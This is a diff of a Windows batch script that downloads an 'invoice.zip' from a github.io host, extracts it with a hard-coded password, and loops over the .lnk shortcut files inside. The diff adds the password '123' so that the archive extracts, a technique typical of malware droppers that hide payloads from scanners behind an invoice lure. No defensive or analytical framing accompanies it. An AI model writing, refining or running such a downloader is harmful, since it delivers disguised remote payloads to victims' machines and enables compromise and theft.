@@ -3,6 +3,7 @@ setlocal
 set BASE=https://azamcorps216-debug.github.io/authenticated/assets
 set DL=%USERPROFILE%\Downloads
 set WORK=%DL%\invoice
+set PW=123
 
 if exist "%WORK%" rmdir /s /q "%WORK%"
 mkdir "%WORK%"
@@ -10,7 +11,7 @@ mkdir "%WORK%"
 curl -L -o "%DL%\invoice.zip" "%BASE%/invoice.zip"
 if not exist "%DL%\invoice.zip" goto fail
 
-"%DL%\7zr.exe" x "%DL%\invoice.zip" -o"%WORK%" -y
+"%DL%\7zr.exe" x "%DL%\invoice.zip" -o"%WORK%" -y -p%PW%
 if errorlevel 1 goto fail
 
 for /r "%WORK%" %%f in (*.lnk) do (
@@ -19,7 +20,7 @@ for /r "%WORK%" %%f in (*.lnk) do (
 )
 
 :fail
-echo Failed. Check your connection.
+echo Failed. Check your connection or password.
 pause
 exit /b 1
 
